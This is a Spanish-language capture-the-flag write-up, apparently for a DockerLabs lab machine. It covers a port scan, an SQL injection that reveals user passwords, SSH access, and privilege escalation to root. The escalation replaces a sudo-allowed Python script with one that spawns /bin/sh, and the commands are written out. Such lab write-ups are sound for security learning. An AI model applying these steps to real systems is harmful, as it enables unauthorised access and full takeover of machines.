# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e370d70d-c544-4739-b152-da4183707011)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp (SSH ):** OpenSSH 9.2p1
2. **80/tcp (HTTP ):** Apache httpd 2.4.59

### Puerto 80
En el puerto 80 de la maquina victima, esta corriendo una pagina de buscar usuarios con su nombre, y nos entrega su contraseña.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6d48e698-be73-42ce-8e8d-d2737ed3e388)

# Fase 3- Explotación

#### or
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5871eec2-627d-496a-9764-b70227da64e8)

Si hacemos una simple inyección sql, nos entrega 3 usuarios y sus respectivas contraseñas.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d30b528b-e3fe-4af9-8d81-2d17dd835c4e)

Nos conectamos por SSH, y proporcionamos la contraseña y estamos dentro!

# Fase 4- Privilegios

#### Python3
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c3fba8bb-2e1b-4166-a912-70cad59054fa)

Despues del respectivo tratamiento de la TTY, al hacer el comando `sudo -l`, vemos que tenemos permisos de ejecución del binario python3, del archivo `system_info.py`.

#### System
Para escalar privilegios con python usamos el comando:
```python
sudo python -c 'import os; os.system("/bin/sh")'
```
Lo que hice fue el archivo original `system_info.py`, cambiarlo de nombre, y en mi maquina victima crear un archivo con el mismo nombre que incluyera el siguiente codigo:
```python
import os

import os; os.system("/bin/sh")
```
Y se lo pase a la maquina victima por el puerto 80, con wget y lo ejecute con el siguiente comando:
```python
sudo -u root /usr/bin/python3 /home/kvzlx/system_info.py

$whoami
root
```
